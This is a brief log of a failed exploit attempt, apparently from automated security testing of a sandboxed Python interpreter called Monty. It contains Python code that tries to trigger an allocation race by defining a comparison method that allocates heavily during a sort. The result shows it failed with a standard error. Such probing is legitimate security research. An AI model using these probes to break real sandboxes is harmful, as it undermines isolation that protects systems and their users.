# Attempt 143 - 2026-06-07T15:21:24.263373+00:00
## Template: G | Score: 0 - Nothing - standard error
## Exploit code
```python
import sys

# Pre-fill allocation counter to ~4,950
garbage = []
for _ in range(700):
    garbage.append(({}, [], set(), b'x', 1, 2.0))

# Create __lt__ that allocates 5+ objects per comparison
def make_lt():
    def lt(s, o):
        _ = [1, 2]
        _ = {'k': 'v'}
        _ = {1, 2}
        _ = (1, 2)
        _ = b'ab'
        return False
    return lt

X = type('X', (), {'__lt__': make_lt()})

items = [X() for _ in range(150)]

try:
    items.sort()
    print("SORT COMPLETED (unexpected)")
except Exception as e:
    print(f"ALLOC RACE TRIGGERED: {e}")
```

## Result
Context: Template G AllocRace - type() takes exactly one argument (3 given) in Monty, cannot create custom class with __lt__
Score: 0/5 - Nothing - standard error
